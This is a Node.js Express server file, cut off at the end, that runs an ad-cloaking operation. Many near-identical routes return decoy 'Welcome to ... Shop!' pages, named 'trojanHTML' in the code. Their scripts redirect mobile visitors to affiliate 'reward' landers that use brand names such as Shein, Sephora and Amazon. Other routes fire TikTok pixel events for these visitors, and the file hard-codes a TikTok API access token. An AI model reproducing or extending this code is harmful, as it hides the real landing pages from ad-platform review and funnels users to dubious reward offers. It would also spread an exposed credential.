const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const xlsx = require('xlsx');
const axios = require('axios');
const WebSocket = require('ws');
const http = require('http');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// TRAPIIIIIIIIIIII

// Function to extract a single IP address (either IPv6 or IPv4)
const extractSingleIP = (ipString) => {
    if (!ipString) return null;
    const ips = ipString.split(',');
    return ips[0].trim(); // Return the first IP address in the list
};

// Test Pixel Events
app.get('/api/test/v1', async (req, res, next) => {
    const { ttclid, s1 } = req.query;
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();
    const payload = {
        pixel_code: "CP7L7DRC77U9TBFP95HG",
        event: "ViewContent",
        timestamp: timestamp,
        test_event_code: "TEST72859",
        context: {
            ad: {
                callback: ttclid
            },
            user_agent: user_agent,
            ip: ip
        },
        properties: {
            contents: [
                {
                    quantity: 1,
                    content_id: "75",
                    content_name: "tokreward"
                }
            ],
            content_type: "product",
            currency: "USD",
            value: 8.00
        }
    };
    
    console.log('Payload:', JSON.stringify(payload, null, 2)); // Log the payload
    
    try {
        // Send the POST request to TikTok's API
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/pixel/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });

        // Handle the response as needed and redirect on success
        console.log(`Test Event Sent. ${ttclid} ${s1}`, response.data);
    } catch (error) {
        console.error('Error TESTING POST request:', error);
    }
});


// Middleware to cloak TRAPI Beta Traffic
app.get('/trapi/:s1', (req, res, next) => {
    const { s1 } = req.params;
    const { ttclid } = req.query;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const ttclid = urlParams.get("ttclid");
                const s1 = "${s1}";
                const destination = \`https://tok-reward.com/api/shein/v1/entry?s1=\${s1}&ttclid=\${ttclid}\`;
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = destination;
                    } else {
                    }
            </script>
            <title>${s1}</title>
        </head>
        <body>
            <h1>Welcome to ${s1} Shop!</h1>
            <p>You are shopping at: ${s1}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served TRAPI Trojan (${s1})`);
});

// Middleware to receive TRAPI Beta Traffic (ENTRY)
app.get('/api/shein/v1/entry', async (req, res) => {
    const { s1, ttclid } = req.query;
    
    // If missing params, send to vanilla MC Camp
    if (!s1 || !ttclid) {
        return res.redirect(`https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d`);
    }
    
    // Collect user info
    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

     // Define the POST request payload
    const payload = {
        pixel_code: "CP7L7DRC77U9TBFP95HG",
        event: "ViewContent",
        timestamp: timestamp,
        context: {
            ad: {
                callback: ttclid
            },
            user_agent: user_agent,
            ip: ip
        },
        properties: {
            contents: [
                {
                    quantity: 1,
                    content_id: "75"
                }
            ],
            content_name: "tokreward",
            content_type: "product",
            currency: "USD"
        }
    };
    
    try {
        // Send the POST request to TikTok's API
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/pixel/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });

       // Handle the response as needed and redirect on success
        console.log(`LPV Posted (${s1})`);
        res.redirect(`https://klcxb6.mcgo2.com/visit/d0ce900e-7ea4-447a-970d-6780185ecd4f?s1=${s1}&ttclid=${ttclid}`);
    } catch (error) {
        console.error('Error making entry POST request', error);
        res.redirect(`https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d?slug=${s1}`);
    }
});


// Middleware to receive TRAPI Beta Traffic (EXIT)
app.get('/api/shein/v1/exit', async (req, res) => {
    const { s1, ttclid } = req.query;

    if (!s1 || !ttclid) {
        // Redirect to Offer Without Parameters if there are none
        return res.redirect('https://glitchy.go2cloud.org/aff_c?offer_id=75&aff_id=2159');
    }

    const ipString = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ip = extractSingleIP(ipString);
    const user_agent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    // Define the POST request payload for ClickButton
    const payload = {
        pixel_code: "CP7L7DRC77U9TBFP95HG",
        event: "AddToCart",
        timestamp: timestamp,
        context: {
            ad: {
                callback: ttclid
            },
            user_agent: user_agent,
            ip: ip
        },
        properties: {
            contents: [
                {
                    quantity: 1,
                    content_id: "75",
                }
            ],
            content_name: "tokreward",
            content_type: "product",
            currency: "USD"
        }
    };

    try {
        // Send the POST request to TikTok's API
        const response = await axios.post('https://business-api.tiktok.com/open_api/v1.3/pixel/track/', payload, {
            headers: {
                'Access-Token': '601495a1fb57efe0e5c313a6c9b0c92055bf35db',
                'Content-Type': 'application/json'
            }
        });

        // Handle the response as needed and redirect on success
        console.log(`CTR Posted (${s1})`);
        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=75&aff_id=2159&source=${s1}`);
    } catch (error) {
        console.error('Error making exit POST request:', error);
        res.redirect(`https://glitchy.go2cloud.org/aff_c?offer_id=75&aff_id=2159&source=${s1}`);
    }
});



// Middleware to receive TRAPI Beta Traffic (FLUENT CVR)
app.get('/api/shein/v1/cvr', async (req, res) => {
    const { s1, s5, price, leadid, tid } = req.query;
    const timestamp = new Date().toISOString();
    res.status(200).send('OK');
});















// Middleware to pass on Tyler's SubIDs MY LANDER
app.get('/twshein/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twshein.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's Debt lander
app.get('/jgw/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = 'https://advantageoasis.com/a7c2c0d53b94dfc6b117bf25c373b152d/?sid1=&sid2=&sid3=&sid4='
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SHEIN IMAGE LANDER
app.get('/twsheinimg/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twsheinimg.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheinimg Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs DIRECT TO MRR 
app.get('/twsheindir/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://sctrk.visit-24.com/4e06a3f4-32c3-5494-8c49-e059ad90b17e/?transaction_id=#clickid#&offer_id=#oid#&aff_id=#affid#&aff_sub=#traffic_source#&msisdn={mobile}&email={email}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SEPHORA
app.get('/twsephora/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twsephora.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SEPHORA IMAGE
app.get('/twsephoraimg/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twsephorauk.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs MY LANDER
app.get('/twsheinuk/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twsheinuk.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs Cash Direct
app.get('/twcash/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://www.rewardslevel.com/aff_c?offer_id=74&aff_id=2612&source=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs Cash Direct Ryder
app.get('/twryddir/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://glitchy.go2cloud.org/aff_c?offer_id=295&aff_id=2612&source=ryder`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ryddir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs Brandy IMG 
app.get('/twbrandy/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/brandy.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served brandy Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs Lulu Camp
app.get('/twlulu/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twlulu.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served lulu Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs DIRECT TO MRR 
app.get('/twryd/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://realrewardshub.com/twryd.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ryd Trojan (tyler)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
app.get('/shein/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the ${slug} Store!</h1>
            <p>You are browsing ${slug}'s Web Shop.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN CA CAMP)
app.get('/sheinca/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/90f05b7d-bdb1-4d1d-9a24-46227673017c?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
app.get('/sheinuk/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/8584e0ec-eef7-4bd2-b0c3-f61d8cf8cf73?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the new ${slug} Store!</h1>
            <p>We hope you enjoy ${slug}'s best products.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
app.get('/sheinau/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/a967a674-626e-404d-8b17-96c3a7dcdcd2?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the new ${slug} Store!</h1>
            <p>We hope you enjoy ${slug}'s best products.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
app.get('/sephora/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/d198df7c-4379-4818-9f7c-ea8e2a34cf6a?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (TARGET CAMP)
app.get('/target/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/af09135d-c73e-410f-addf-52b822c5351a?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (Zara CAMP)
app.get('/zara/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/a2dadc4f-b6d9-45d6-9838-317fb8c87e54?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (Amazon CAMP)
app.get('/amazon/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/53e2a32d-c43c-4b20-897f-dddab411b84c?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (FashionNova CAMP)
app.get('/fashionnova/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/7a95779d-bd9c-497c-ad4e-918f2078eded?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (H&M CAMP)
app.get('/hm/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/25001004-8d19-4e91-a62c-c8fd7d03c296?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (Lululemon CAMP)
app.get('/lululemon/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/f5a95963-6d2c-4c00-a5b9-c17f355de213?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (${slug})`);
});

// Middleware to pass on my slug values to MaxConv (PrincessPolly CAMP)
